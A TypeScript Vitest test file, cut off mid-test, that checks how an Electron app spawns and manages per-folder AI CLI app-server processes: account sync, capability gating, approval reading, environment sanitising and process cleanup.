import { EventEmitter } from 'node:events';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { MINIMUM_SUPPORTED_RUNTIME_VERSION, AGENT_EVENT_SCHEMA_VERSION } from '@agiworkforce/types';
import {
  type DeveloperSessionEvent,
  type DeveloperSessionList,
  type WorkspaceRoot,
} from '@agiworkforce/local-runtime-contract';

const root: WorkspaceRoot = {
  id: 'root-1',
  path: '/approved/project',
  name: 'project',
  grantedAtMs: 0,
  lastOpenedAtMs: 0,
};

const listRoots = vi.fn<() => WorkspaceRoot[]>(() => [root]);
const getRoot = vi.fn<(id: string) => WorkspaceRoot | undefined>(() => root);
const readWorkspaceGit = vi.fn(
  async (): Promise<{ git: { branch: string } | null; unavailableReason?: string }> => ({
    git: { branch: 'main' },
  }),
);

const statSync = vi.fn(() => ({ isDirectory: () => true }));
const accessSync = vi.fn();
const constants = { X_OK: 1 };

vi.mock('electron', () => ({ app: { getPath: () => '/tmp' } }));
vi.mock('node:fs', () => ({
  statSync,
  accessSync,
  constants,
  default: { statSync, accessSync, constants },
}));
vi.mock('node:os', () => ({ default: { homedir: () => '/Users/qa' }, homedir: () => '/Users/qa' }));
class WorktreeRootRefused extends Error {}
const admitWorktreeRoot = vi.fn(
  async (parentId: string, worktreeId: string, checkoutPath: string, name: string) => ({
    id: `${parentId}::worktree::${worktreeId}`,
    path: checkoutPath,
    name,
    grantedAtMs: 0,
    lastOpenedAtMs: 0,
  }),
);
const forgetWorktreeRoot = vi.fn();
vi.mock('../runtime/workspaceStore', () => ({
  listRoots,
  getRoot,
  admitWorktreeRoot,
  forgetWorktreeRoot,
  WorktreeRootRefused,
}));
vi.mock('../runtime/gitService', () => ({ readWorkspaceGit }));
vi.mock('../config', () => ({ CLOUD_APP_ORIGIN: 'http://localhost:3100' }));
const shellSignedCliIn = vi.fn(() => false);
const rememberShellSignedCliIn = vi.fn();
vi.mock('../runtime/cliAccountStore', () => ({ shellSignedCliIn, rememberShellSignedCliIn }));

type Responder = (method: string, params: Record<string, unknown>) => unknown;

class RpcFailure {
  constructor(readonly error: { code: number; message: string; data?: unknown }) {}
}

class FakeStream extends EventEmitter {
  setEncoding(): void {}
}

class FakeChild extends EventEmitter {
  readonly pid = 4242;
  readonly stdout = new FakeStream();
  readonly stderr = new FakeStream();
  readonly written: Array<{ method: string; params: Record<string, unknown> }> = [];
  ended = false;
  readonly stdin = {
    write: (line: string, callback?: (error?: Error) => void) => {
      const message = JSON.parse(line) as {
        id: number;
        method: string;
        params?: Record<string, unknown>;
      };
      this.written.push({ method: message.method, params: message.params ?? {} });
      callback?.();
      const result = this.respond(message.method, message.params ?? {});
      if (result instanceof RpcFailure) this.fail(message.id, result.error);
      else if (result !== undefined) this.reply(message.id, result);
      return true;
    },
    end: () => {
      this.ended = true;
    },
  };

  constructor(private readonly respond: Responder) {
    super();
  }

  reply(id: number, result: unknown): void {
    this.stdout.emit('data', `${JSON.stringify({ jsonrpc: '2.0', id, result })}\n`);
  }

  fail(id: number, error: RpcFailure['error']): void {
    this.stdout.emit('data', `${JSON.stringify({ jsonrpc: '2.0', id, error })}\n`);
  }

  notify(method: string, params: unknown): void {
    this.stdout.emit('data', `${JSON.stringify({ jsonrpc: '2.0', method, params })}\n`);
  }
}

const BASE_CAPABILITIES = { threads: true, turns: true, streaming: true, approvals: true };

const HANDSHAKE = {
  protocolVersion: 8,
  serverInfo: { name: 'agiworkforce-app-server', title: 'AGI', version: '1.7.1' },
  capabilities: { ...BASE_CAPABILITIES, worktrees: true, checkpoints: true, threadDelete: true },
};

const thread = {
  id: 'thread-1',
  title: 'Quote the readme',
  cwd: root.path,
  model: 'a-model',
  provider: 'a-provider',
  trustMode: 'byok',
  status: 'idle',
  createdAt: '2026-09-14T11:00:00Z',
  updatedAt: '2026-09-14T11:05:00Z',
  createdBy: 'cli',
};

function defaultResponder(method: string): unknown {
  if (method === 'initialize') return HANDSHAKE;
  if (method === 'thread/list') return { threads: [thread] };
  if (method === 'thread/start') return { thread: { ...thread, id: 'thread-new' } };
  if (method === 'thread/read') {
    return {
      thread,
      messages: [
        { role: 'user', text: 'Quote the readme' },
        { role: 'assistant', text: '# QA project' },
      ],
      transcriptTruncated: false,
    };
  }
  if (method === 'thread/reconnect') return { thread };
  if (method === 'worktree/list') return { worktrees: [], keep: 15 };
  if (method === 'turn/start' || method === 'turn/steer')
    return { turn: { id: 'turn-1', threadId: thread.id, status: 'running' } };
  if (
    method === 'turn/interrupt' ||
    method === 'approval/respond' ||
    method === 'userInput/respond'
  )
    return { acknowledged: true };
  if (method === 'model/list') {
    return {
      models: [{ id: 'qwen2.5:1.5b', provider: 'ollama' }],
      hostModels: [
        { id: 'qwen2.5:1.5b', provider: 'ollama', reachable: true, trustMode: 'local' },
        {
          id: 'qa-provider/qa-default',
          provider: 'qa-provider',
          reachable: false,
          trustMode: 'byok',
          unreachable: {
            code: 'provider_auth_missing',
            action: 'sign_in_provider',
            provider: 'qa-provider',
          },
        },
      ],
    };
  }
  if (method === 'settings/read') {
    return {
      defaultModel: 'qa-provider/qa-default',
      permissionMode: 'auto',
      defaultEffort: 'high',
    };
  }
  if (method === 'account/status') return { signedIn: true, cached: false, source: 'cli' };
  return undefined;
}

let agentAllowed: (candidate: WorkspaceRoot) => boolean = () => true;
let killProcess: ReturnType<typeof vi.spyOn>;

async function loadService(
  responder: Responder = defaultResponder,
  accountBridge?: {
    readShellIdentity: () => Promise<{ signedIn: boolean; email: string | null } | null>;
    approveDeviceCode: (userCode: string) => Promise<void>;
  },
  answersUserInput?: () => boolean,
) {
  vi.resetModules();
  const children: FakeChild[] = [];
  const events: Array<{ rootId: string; event: DeveloperSessionEvent }> = [];
  const spawn = vi.fn((_command: string, args: readonly string[]) => {
    const child = new FakeChild(responder);
    children.push(child);
    if (args[0] === '--version') {
      setTimeout(() => {
        child.stdout.emit('data', 'agi 1.7.1\n');
        child.emit('exit', 0, null);
      }, 0);
    }
    return child;
  });

  const service = await import('../runtime/developerSessionService');
  service.configureDeveloperSessions({
    emit: (rootId, event) => events.push({ rootId, event }),
    resolveBinary: () => 'agi',
    mayRunIn: (candidate) => agentAllowed(candidate),
    spawn: spawn as never,
    ...(accountBridge ? { accountBridge } : {}),
    ...(answersUserInput ? { answersUserInput } : {}),
  });

  return { service, children, events, spawn };
}

beforeEach(() => {
  vi.clearAllMocks();
  listRoots.mockReturnValue([root]);
  getRoot.mockReturnValue(root);
  statSync.mockReturnValue({ isDirectory: () => true });
  accessSync.mockReturnValue(undefined);
  shellSignedCliIn.mockReturnValue(false);
  process.env['PATH'] = '/Users/qa/.cargo/bin:/usr/bin';
  // The fake children carry a made-up pid, and the service kills the process
  // group of a server it closes. Without this the suite would signal whatever
  // real group happens to hold that number.
  killProcess = vi.spyOn(process, 'kill').mockImplementation(() => true);
});

afterEach(() => {
  vi.useRealTimers();
  killProcess.mockRestore();
});

/** A version just below the supported floor, whatever the floor is. */
function versionBelowFloor(): string {
  const floor = MINIMUM_SUPPORTED_RUNTIME_VERSION.split('.').map(Number);
  const last = floor.findLastIndex((part) => part > 0);
  expect(last, 'the floor must be above 0.0.0 for an older CLI to exist').toBeGreaterThan(-1);
  return floor
    .map((part, index) => (index < last ? part : index === last ? part - 1 : 999))
    .join('.');
}

describe('developer session runtime', () => {
  it('spawns one app-server per approved folder, in that folder', async () => {
    const { service, spawn } = await loadService();

    await service.listDeveloperSessions();
    await service.listDeveloperSessions();

    expect(spawn).toHaveBeenCalledTimes(1);
    expect(spawn).toHaveBeenCalledWith(
      '/Users/qa/.cargo/bin/agi',
      ['app-server'],
      expect.objectContaining({ cwd: root.path }),
    );
  });

  it('points the app-server at the origin the shell itself is signed in to', async () => {
    const { service, spawn } = await loadService();

    await service.listDeveloperSessions();

    expect(spawn).toHaveBeenCalledWith(
      '/Users/qa/.cargo/bin/agi',
      ['app-server'],
      expect.objectContaining({
        env: expect.objectContaining({
          AGIWORKFORCE_API_BASE: 'http://localhost:3100',
          AGI_AUTH_BASE: 'http://localhost:3100/api',
        }),
      }),
    );
  });

  it('never hands the app-server a variable that turns its sandbox or a guard off', async () => {
    const lifted = [
      'AGIWORKFORCE_NO_SANDBOX',
      'AGIWORKFORCE_SANDBOX_HOOKS',
      'AGIWORKFORCE_SANDBOX_MCP',
      'AGI_POWERSHELL_ALLOW_UNSAFE',
      'AGI_A2A_ALLOW_PRIVATE',
    ];
    for (const name of lifted) process.env[name] = '1';
    try {
      const { service, spawn } = await loadService();

      await service.listDeveloperSessions();

      const [, , options] = spawn.mock.calls.find(([, args]) => args[0] === 'app-server') as [
        string,
        readonly string[],
        { env: Record<string, string> },
      ];
      for (const name of lifted) expect(options.env, name).not.toHaveProperty(name);
      expect(options.env['PATH']).toBe('/Users/qa/.cargo/bin:/usr/bin');
      expect(options.env['AGIWORKFORCE_API_BASE']).toBe('http://localhost:3100');
    } finally {
      for (const name of lifted) delete process.env[name];
    }
  });

  it('signs a new app-server in as the shell account and refreshes its models', async () => {
    let signedIn = false;
    const asked: string[] = [];
    const approveDeviceCode = vi.fn(async () => undefined);
    const { service } = await loadService(
      (method, params) => {
        asked.push(method);
        if (method === 'account/status') return { signedIn, cached: false, source: 'cli' };
        if (method === 'account/login')
          return {
            loginId: 'login-1',
            verificationUrl: 'http://localhost:3100/auth/device',
            userCode: 'QRST-9876',
          };
        if (method === 'account/login/wait') {
          signedIn = true;
          return { outcome: 'completed', account: { signedIn: true } };
        }
        return defaultResponder(method, params);
      },
      {
        readShellIdentity: async () => ({ signedIn: true, email: 'qa@agiworkforce.com' }),
        approveDeviceCode,
      },
    );

    await service.listDeveloperSessions();
    await service.syncDeveloperAccounts();

    expect(approveDeviceCode).toHaveBeenCalledExactlyOnceWith('QRST-9876');
    expect(asked).toContain('account/login/wait');
    expect(asked.filter((method) => method === 'model/list')).toHaveLength(1);
    expect((await service.readDeveloperRuntimeStatus()).accountSyncError).toBeNull();
  });

  it('signs every running app-server out when the shell that signed them in signs out', async () => {
    shellSignedCliIn.mockReturnValue(true);
    const asked: string[] = [];
    const { service } = await loadService(
      (method, params) => {
        asked.push(method);
        if (method === 'account/logout') return null;
        return defaultResponder(method, params);
      },
      {
        readShellIdentity: async () => ({ signedIn: false, email: null }),
        approveDeviceCode: async () => undefined,
      },
    );

    await service.listDeveloperSessions();
    await service.syncDeveloperAccounts();

    expect(asked).toContain('account/logout');
    expect(asked).not.toContain('account/login');
  });

  it('reports a refused approval on the CLI row and leaves the app-server running', async () => {
    const { service } = await loadService(
      (method, params) => {
        if (method === 'account/status') return { signedIn: false, cached: false, source: 'cli' };
        if (method === 'account/login')
          return {
            loginId: 'login-1',
            verificationUrl: 'http://localhost:3100/auth/device',
            userCode: 'QRST-9876',
          };
        return defaultResponder(method, params);
      },
      {
        readShellIdentity: async () => ({ signedIn: true, email: 'qa@agiworkforce.com' }),
        approveDeviceCode: async () => {
          throw new Error('Device sign-in is turned off for this account.');
        },
      },
    );

    await service.listDeveloperSessions();
    await service.syncDeveloperAccounts();

    const status = await service.readDeveloperRuntimeStatus();

    expect(status.available).toBe(true);
    expect(status.accountSyncError).toBe('Device sign-in is turned off for this account.');
    expect((await service.listDeveloperSessions()).groups[0]?.unavailable).toBeUndefined();
  });

  it('refreshes every folder once the account changed, not only the one that signed in', async () => {
    const second: WorkspaceRoot = { ...root, id: 'root-2', path: '/approved/other', name: 'other' };
    listRoots.mockReturnValue([root, second]);
    getRoot.mockImplementation((id) => (id === second.id ? second : root));
    let signedIn = false;
    const refreshedPerChild: number[] = [];
    const { service, children } = await loadService(
      (method, params) => {
        if (method === 'account/status') return { signedIn, cached: false, source: 'cli' };
        if (method === 'account/login')
          return {
            loginId: 'login-1',
            verificationUrl: 'http://localhost:3100/auth/device',
            userCode: 'QRST-9876',
          };
        if (method === 'account/login/wait') {
          signedIn = true;
          return { outcome: 'completed', account: { signedIn: true } };
        }
        return defaultResponder(method, params);
      },
      {
        readShellIdentity: async () => ({ signedIn: true, email: 'qa@agiworkforce.com' }),
        approveDeviceCode: async () => undefined,
      },
    );

    await service.listDeveloperSessions();
    await service.syncDeveloperAccounts();

    for (const child of children) {
      refreshedPerChild.push(
        child.written.filter(
          (entry) => entry.method === 'model/list' && entry.params['refresh'] === true,
        ).length,
      );
    }
    expect(children).toHaveLength(2);
    expect(refreshedPerChild.every((count) => count >= 1)).toBe(true);
  });

  it('reads the CLI it would start, with its version and where it lives', async () => {
    const { service } = await loadService();

    const status = await service.readDeveloperRuntimeStatus();

    expect(status).toEqual({
      available: true,
      name: 'agi',
      version: '1.7.1',
      path: '~/.cargo/bin/agi',
      hint: null,
      source: 'custom',
      accountSyncError: null,
      capabilities: [],
    });
  });

  it('offers no feature until a CLI has answered initialize, then what that CLI serves', async () => {
    const { service } = await loadService((method) =>
      method === 'initialize'
        ? {
            ...HANDSHAKE,
            capabilities: { ...HANDSHAKE.capabilities, writerLease: true, revertRestore: true },
          }
        : defaultResponder(method),
    );
    expect((await service.readDeveloperRuntimeStatus()).capabilities).toEqual([]);

    await service.listDeveloperSessions();

    expect((await service.readDeveloperRuntimeStatus()).capabilities).toEqual([
      'worktrees',
      'checkpoints',
      'agent_mode',
      'reasoning_effort',
      'context_files',
      'steer',
      'user_input',
      'review',
      'approval_decisions',
      'thread_delete',
      'images',
      'rewind_choice',
      'thread_archive',
      'thread_takeover',
    ]);
  });

  it('hides what the running CLI said at initialize it cannot serve', async () => {
    const { service } = await loadService((method) =>
      method === 'initialize'
        ? { ...HANDSHAKE, capabilities: { ...BASE_CAPABILITIES, worktrees: true } }
        : defaultResponder(method),
    );
    await service.listDeveloperSessions();
    const { capabilities } = await service.readDeveloperRuntimeStatus();

    expect(capabilities).toContain('worktrees');
    expect(capabilities).not.toContain('checkpoints');
    expect(capabilities).not.toContain('review');
    expect(capabilities).not.toContain('thread_delete');
    expect(capabilities).not.toContain('thread_takeover');
    expect(capabilities).toContain('steer');
  });

  it('offers approval decisions only to a CLI that serves approvals', async () => {
    const { service } = await loadService((method) =>
      method === 'initialize'
        ? { ...HANDSHAKE, capabilities: { threads: true, turns: true } }
        : defaultResponder(method),
    );

    await service.listDeveloperSessions();

    const { capabilities } = await service.readDeveloperRuntimeStatus();
    expect(capabilities).not.toContain('approval_decisions');
    expect(capabilities).toContain('agent_mode');
  });

  it('archives a session through the CLI and reports only an acknowledged archive', async () => {
    let acknowledged = true;
    const { service, children } = await loadService((method) =>
      method === 'thread/archive' ? { acknowledged } : defaultResponder(method),
    );

    await expect(service.archiveDeveloperThread(root.id, thread.id)).resolves.toBe(true);
    const sent = children
      .flatMap((child) => child.written)
      .find((entry) => entry.method === 'thread/archive');
    expect(sent?.params).toEqual({ threadId: thread.id });

    acknowledged = false;
    await expect(service.archiveDeveloperThread(root.id, thread.id)).rejects.toThrow(
      /did not say it archived/,
    );
  });

  it('names the program writing a session when the CLI refuses a turn for it', async () => {
    const { service } = await loadService((method) =>
      method === 'turn/start'
        ? new RpcFailure({
            code: -32011,
            message: 'agi in Terminal is writing this thread; take it over or wait',
            data: { threadId: thread.id, writer: { holderLabel: 'agi in Terminal' } },
          })
        : defaultResponder(method),
    );

    const failure = await service
      .startDeveloperTurn({ rootId: root.id, threadId: thread.id, text: 'continue' })
      .catch((error: unknown) => error);

    expect(failure).toBeInstanceOf(service.DeveloperThreadHeldError);
    expect((failure as Error).message).toBe('agi in Terminal is writing this session.');
  });

  it('takes a session over on a CLI that serves the writer lease, and refuses on one that does not', async () => {
    const { service, children } = await loadService((method) => {
      if (method === 'initialize') {
        return { ...HANDSHAKE, capabilities: { ...HANDSHAKE.capabilities, writerLease: true } };
      }
      if (method === 'thread/writer/takeover') return { thread };
      return defaultResponder(method);
    });

    await expect(service.takeOverDeveloperThread(root.id, thread.id)).resolves.toEqual(
      expect.objectContaining({ id: thread.id, rootId: root.id }),
    );
    const sent = children
      .flatMap((child) => child.written)
      .find((entry) => entry.method === 'thread/writer/takeover');
    expect(sent?.params).toEqual({ threadId: thread.id });

    const older = await loadService();
    await expect(older.service.takeOverDeveloperThread(root.id, thread.id)).rejects.toThrow(
      /Update the AGI CLI/,
    );
    expect(
      older.children.flatMap((child) => child.written).map((entry) => entry.method),
    ).not.toContain('thread/writer/takeover');
  });

  it('offers deleting a session only once the CLI says it serves thread/delete', async () => {
    const { service } = await loadService((method) =>
      method === 'initialize'
        ? { ...HANDSHAKE, capabilities: { ...BASE_CAPABILITIES, threadDelete: true } }
        : defaultResponder(method),
    );

    await service.listDeveloperSessions();

    expect((await service.readDeveloperRuntimeStatus()).capabilities).toContain('thread_delete');
  });

  it('reads a pending approval from the CLI with its risk and proposed rule, and nothing else', async () => {
    const pendingApproval = {
      requestId: 'ask-1',
      kind: 'Exec { command: "pnpm test" }',
      summary: 'Run pnpm test',
      detail: 'in /work/project',
      riskLevel: 'high',
      reversible: false,
      proposedExecpolicyAmendment: ['pnpm', 'test'],
    };
    const { service } = await loadService((method) =>
      method === 'thread/reconnect'
        ? {
            thread,
            activeTurn: {
              turnId: 'turn-1',
              pendingApprovals: [pendingApproval, { requestId: 'ask-2', summary: 'Run ls' }],
            },
          }
        : defaultResponder(method),
    );
    const ids = { rootId: root.id, threadId: thread.id, turnId: 'turn-1' };

    await expect(service.readPendingApproval({ ...ids, requestId: 'ask-1' })).resolves.toEqual({
      request: {
        requestId: 'ask-1',
        kind: 'Exec',
        summary: 'Run pnpm test',
        detail: 'in /work/project',
        command: 'pnpm test',
        riskLevel: 'high',
        reversible: false,
        proposedCommandPrefix: ['pnpm', 'test'],
      },
      reserved: [],
    });
    await expect(service.readPendingApproval({ ...ids, requestId: 'ask-2' })).resolves.toEqual({
      request: {
        requestId: 'ask-2',
        kind: '',
        summary: 'Run ls',
        detail: '',
        command: null,
        riskLevel: null,
        reversible: null,
      },
      reserved: [],
    });
    await expect(service.readPendingApproval({ ...ids, requestId: 'ask-3' })).resolves.toBeNull();
    await expect(
      service.readPendingApproval({ ...ids, turnId: 'turn-old', requestId: 'ask-1' }),
    ).resolves.toBeNull();
  });

  it('starts no CLI in a folder the agent is not allowed to run in', async () => {
    agentAllowed = () => false;
    try {
      const { service, spawn } = await loadService();
      const refused = (error: unknown) =>
        error instanceof service.DeveloperAgentNotAllowedError &&
        /not allowed in/u.test(error.message);

      await expect(service.readDeveloperModels(root.id)).rejects.toSatisfy(refused);
      await expect(service.readDeveloperSession(root.id, thread.id)).rejects.toSatisfy(refused);
      await expect(
        service.startDeveloperTurn({ rootId: root.id, threadId: thread.id, text: 'go' }),
      ).rejects.toSatisfy(refused);
      await expect(service.interruptDeveloperTurn(root.id, thread.id, 'turn-1')).rejects.toSatisfy(
        refused,
      );
      await expect(
        service.answerDeveloperApproval({
          rootId: root.id,
          threadId: thread.id,
          turnId: 'turn-1',
          requestId: 'ask-1',
          decision: 'approve_once',
        }),
      ).rejects.toSatisfy(refused);
      expect(spawn.mock.calls.filter(([, args]) => args[0] === 'app-server')).toEqual([]);
    } finally {
      agentAllowed = () => true;
    }
  });

  it('refuses a worktree, checkpoint or delete call the running CLI did not advertise, before sending it', async () => {
    const { service, children } = await loadService((method) =>
      method === 'initialize'
        ? { ...HANDSHAKE, capabilities: BASE_CAPABILITIES }
        : defaultResponder(method),
    );
    // The CLI here is the one on the PATH, which updating the app would not replace.
    const CLI_UPDATE = 'Update the AGI CLI at ~/.cargo/bin/agi, then try again.';

    await expect(
      service.startDeveloperSession(root.id, undefined, { environment: 'worktree' }),
    ).rejects.toThrow(CLI_UPDATE);
    await expect(service.listDeveloperCheckpoints(root.id, thread.id)).rejects.toThrow(CLI_UPDATE);
    await expect(service.readDeveloperCheckpointDiff(root.id, thread.id, 'turn-1')).rejects.toThrow(
      CLI_UPDATE,
    );
    await expect(
      service.revertDeveloperCheckpoint({
        rootId: root.id,
        threadId: thread.id,
        turnId: 'turn-1',
        preview: true,
        sections: [{ path: 'src/a.ts' }],
      }),
    ).rejects.toThrow(CLI_UPDATE);
    await expect(
      service.deleteDeveloperThread({ rootId: root.id, threadId: thread.id }),
    ).rejects.toThrow(CLI_UPDATE);
    await expect(
      service.forkDeveloperThread({ rootId: root.id, threadId: thread.id, throughTurnId: 't-1' }),
    ).rejects.toThrow(CLI_UPDATE);

    const sent = children.flatMap((child) => child.written.map((entry) => entry.method));
    expect(sent).not.toContain('worktree/create');
    expect(sent.some((method) => method.startsWith('checkpoint/'))).toBe(false);
    expect(sent).not.toContain('thread/delete');
    expect(sent).not.toContain('thread/fork');
    await expect(
      service.compactDeveloperThread({ rootId: root.id, threadId: thread.id }),
    ).rejects.toThrow(CLI_UPDATE);
    expect(children.flatMap((child) => child.written.map((entry) => entry.method))).not.toContain(
      'thread/compact',
    );
  });

  it('summarizes a session from a turn on a CLI that serves thread/compact', async () => {
    const answer = {
      threadId: thread.id,
      compacted: true,
      messagesSummarized: 6,
      tokensBefore: 40_000,
      tokensAfter: 8_000,
    };
    const { service, children } = await loadService((method) => {
      if (method === 'initialize') {
        return { ...HANDSHAKE, capabilities: { ...HANDSHAKE.capabilities, threadCompact: true } };
      }
      if (method === 'thread/compact') return answer;
      return defaultResponder(method);
    });

    await expect(
      service.compactDeveloperThread({
        rootId: root.id,
        threadId: thread.id,
        fromTurnId: 'turn-2',
      }),
    ).resolves.toEqual(answer);
    await service.compactDeveloperThread({ rootId: root.id, threadId: thread.id });

    const sent = children
      .flatMap((child) => child.written)
      .filter((entry) => entry.method === 'thread/compact')
      .map((entry) => entry.params);
    expect(sent).toEqual([{ threadId: thread.id, fromTurnId: 'turn-2' }, { threadId: thread.id }]);
    expect((await service.readDeveloperRuntimeStatus()).capabilities).toContain('thread_compact');
  });

  it('branches a session through one turn on a CLI that can cut the copy there', async () => {
    const { service, children } = await loadService((method) => {
      if (method === 'initialize') {
        return { ...HANDSHAKE, capabilities: { ...HANDSHAKE.capabilities, forkThroughTurn: true } };
      }
      if (method === 'thread/fork') return { thread: { ...thread, id: 'thread-branch' } };
      return defaultResponder(method);
    });

    const forked = await service.forkDeveloperThread({
      rootId: root.id,
      threadId: thread.id,
      throughTurnId: 'turn-1',
    });

    expect(forked).toEqual(expect.objectContaining({ id: 'thread-branch', rootId: root.id }));
    const fork = children
      .flatMap((child) => child.written)
      .find((entry) => entry.method === 'thread/fork');
    expect(fork?.params).toEqual({ threadId: thread.id, throughTurnId: 'turn-1' });
    expect((await service.readDeveloperRuntimeStatus()).capabilities).toContain('thread_fork');
  });

  it('resolves the CLI once and answers from that until the path changes', async () => {
    const { service, spawn } = await loadService();

    await service.readDeveloperRuntimeStatus();
    await service.readDeveloperRuntimeStatus();
    await service.readDeveloperRuntimeStatus();

    expect(spawn).toHaveBeenCalledTimes(1);
    expect(spawn).toHaveBeenCalledWith(
      '/Users/qa/.cargo/bin/agi',
      ['--version'],
      expect.anything(),
    );
  });

  it('resolves again when the preference names a different binary', async () => {
    vi.resetModules();
    const children: FakeChild[] = [];
    let binary = 'agi';
    const spawn = vi.fn((_command: string, args: readonly string[]) => {
      const child = new FakeChild(defaultResponder);
      children.push(child);
      if (args[0] === '--version') {
        setTimeout(() => {
          child.stdout.emit('data', 'agi 1.7.1\n');
          child.emit('exit', 0, null);
        }, 0);
      }
      return child;
    });
    const service = await import('../runtime/developerSessionService');
    service.configureDeveloperSessions({
      emit: () => undefined,
      resolveBinary: () => binary,
      mayRunIn: () => true,
      spawn: spawn as never,
    });

    await service.readDeveloperRuntimeStatus();
    binary = '/opt/agi';
    await service.readDeveloperRuntimeStatus();

    expect(spawn).toHaveBeenCalledTimes(2);
    expect(spawn).toHaveBeenLastCalledWith('/opt/agi', ['--version'], expect.anything());
  });

  // A bare name leaves the lookup to the system, which on some systems looks
  // in the working directory first, and that is a project folder.
  it('never starts a CLI it could not resolve to an absolute path, and looks in no relative PATH entry', async () => {
    const { service, spawn } = await loadService();
    process.env['PATH'] = '.:bin:';
    accessSync.mockReturnValue(undefined);

    const list: DeveloperSessionList = await service.listDeveloperSessions();

    expect(spawn).not.toHaveBeenCalled();
    expect(list.groups[0]?.unavailable?.message).toContain("not on this app's PATH");
  });

  it('says the CLI is nowhere on the PATH, with the hint the surface prints', async () => {
    const { service } = await loadService();
    accessSync.mockImplementation(() => {
      throw new Error('ENOENT');
    });

    const status = await service.readDeveloperRuntimeStatus();

    expect(status.available).toBe(false);
    expect(status.path).toBeNull();
    expect(status.hint).toContain('agiworkforce.com/install.sh');
  });

  it('refuses a CLI older than the runtime this app supports, naming the floor', async () => {
    const older = versionBelowFloor();
    const { service } = await loadService((method) =>
      method === 'initialize'
        ? { ...HANDSHAKE, serverInfo: { ...HANDSHAKE.serverInfo, version: older } }
        : defaultResponder(method),
    );

    const list: DeveloperSessionList = await service.listDeveloperSessions();

    expect(list.groups[0]?.sessions).toEqual([]);
    expect(list.groups[0]?.unavailable?.message).toContain(
      `reports version "${older}"; this app needs ${MINIMUM_SUPPORTED_RUNTIME_VERSION} or newer`,
    );
    expect(list.groups[0]?.unavailable?.hint).toContain('Update the AGI CLI');
  });

  it('ends the process of a CLI it refused at the handshake, so a retry does not leave one running', async () => {
    const older = versionBelowFloor();
    const { service, children, spawn } = await loadService((method) =>
      method === 'initialize'
        ? { ...HANDSHAKE, serverInfo: { ...HANDSHAKE.serverInfo, version: older } }
        : defaultResponder(method),
    );
    vi.useFakeTimers();

    await expect(service.readDeveloperModels(root.id)).rejects.toThrow(/needs .* or newer/u);
    await expect(service.readDeveloperModels(root.id)).rejects.toThrow(/needs .* or newer/u);

    const servers = children.filter(
      (_child, index) => spawn.mock.calls[index]?.[1][0] === 'app-server',
    );
    expect(servers).toHaveLength(2);
    expect(servers.every((child) => child.ended)).toBe(true);
    expect(killProcess).not.toHaveBeenCalled();

    await vi.advanceTimersByTimeAsync(2_000);
    expect(killProcess.mock.calls).toEqual([
      [-4242, 'SIGKILL'],
      [-4242, 'SIGKILL'],
    ]);
  });

  it('ends the process of a CLI that writes something that is not protocol', async () => {
    const { service, children, events } = await loadService();
    await service.listDeveloperSessions();
    vi.useFakeTimers();

    children[0]?.stdout.emit('data', 'this is not json\n');

    expect(events.at(-1)?.event).toMatchObject({ type: 'runtime-stopped' });
    expect(children[0]?.ended).toBe(true);
    await vi.advanceTimersByTimeAsync(2_000);
    expect(killProcess.mock.calls).toEqual([[-4242, 'SIGKILL']]);
  });

  it('kills every process at quit without waiting for the grace, running or already told to stop', async () => {
    const second: WorkspaceRoot = { ...root, id: 'root-2', path: '/approved/other', name: 'other' };
    listRoots.mockReturnValue([root, second]);
    getRoot.mockImplementation((id: string) => (id === second.id ? second : root));
    const { service, children } = await loadService();
    await service.listDeveloperSessions();
    expect(children).toHaveLength(2);
    vi.useFakeTimers();

    service.stopDeveloperRuntime(root.id);
    expect(killProcess).not.toHaveBeenCalled();

    service.killAllDeveloperRuntimes();

    expect(killProcess.mock.calls).toEqual([
      [-4242, 'SIGKILL'],
      [-4242, 'SIGKILL'],
    ]);
    expect(children.every((child) => child.ended)).toBe(true);
    await vi.advanceTimersByTimeAsync(2_000);
    expect(killProcess).toHaveBeenCalledTimes(2);
  });

  it('reads the setup script and the worktree name from the folder own CLI, never from the caller', async () => {
    const { service } = await loadService((method) =>
      method === 'worktree/list'
        ? {
            keep: 15,
            setupScript: {
              path: '/approved/project/.agiworkforce/worktree-setup',
              sha256: 'a'.repeat(64),
              approved: false,
            },
            worktrees: [
              {
                id: 'abcdef12',
                path: '/Users/qa/.agiworkforce/worktrees/abcdef12/checkout',
                label: 'retry fix',
                start: { kind: 'ref', name: 'HEAD' },
              },
            ],
          }
        : defaultResponder(method),
    );

    await expect(
      service.readWorktreeSetupScript(`${root.id}::worktree::abcdef12`),
    ).resolves.toEqual({
      path: '/approved/project/.agiworkforce/worktree-setup',
      worktree: 'project · retry fix',
    });
    await expect(
      service.readWorktreeSetupScript(`${root.id}::worktree::00000000`),
    ).resolves.toBeNull();
  });

  it('signals nothing once the process has already exited', async () => {
    const { service, children } = await loadService();
    await service.listDeveloperSessions();
    vi.useFakeTimers();

    children[0]?.emit('exit', 1, null);
    service.stopDeveloperRuntime(root.id);
    await vi.advanceTimersByTimeAsync(2_000);

    expect(killProcess).not.toHaveBeenCalled();
  });

  it('reports a missing CLI as an unavailable folder rather than throwing', async () => {
    vi.resetModules();
    const service = await import('../runtime/developerSessionService');
    service.configureDeveloperSessions({
      emit: () => undefined,
      resolveBinary: () => 'agi',
      mayRunIn: () => true,
      spawn: (() => {
        const error: NodeJS.ErrnoException = new Error('spawn agi ENOENT');
        error.code = 'ENOENT';
        throw error;
      }) as never,
    });

    const list: DeveloperSessionList = await service.listDeveloperSessions();

    expect(list.groups).toHaveLength(1);
    expect(list.groups[0]?.sessions).toEqual([]);
    expect(list.groups[0]?.unavailable?.message).toContain('not on this app');
    expect(list.groups[0]?.unavailable?.hint).toContain('agiworkforce.com/install.sh');
  });

  it('reads the models, the configured default and the account in one call', async () => {
    const { service } = await loadService();

    const models = await service.readDeveloperModels(root.id);

    expect(models).toEqual({
      models: [{ id: 'qwen2.5:1.5b', provider: 'ollama', local: true }],
      hostModels: [
        {
          id: 'qwen2.5:1.5b',
          provider: 'ollama',
          reachable: true,
          trustMode: 'local',
          unreachable: null,
        },
        {
          id: 'qa-provider/qa-default',
          provider: 'qa-provider',
          reachable: false,
          trustMode: 'byok',
          unreachable: {
            code: 'provider_auth_missing',
            action: 'sign_in_provider',
            provider: 'qa-provider',
          },
        },
      ],
      defaultModelId: 'qa-provider/qa-default',
      defaultAgentMode: 'auto',
      defaultReasoningEffort: 'high',
      managedSignedIn: true,
      features: { maxTurns: false, memory: false },
    });
  });

  it('never reports bypass as the default posture, even if a CLI stored one', async () => {
    const { service } = await loadService((method, params) =>
      method === 'settings/read'
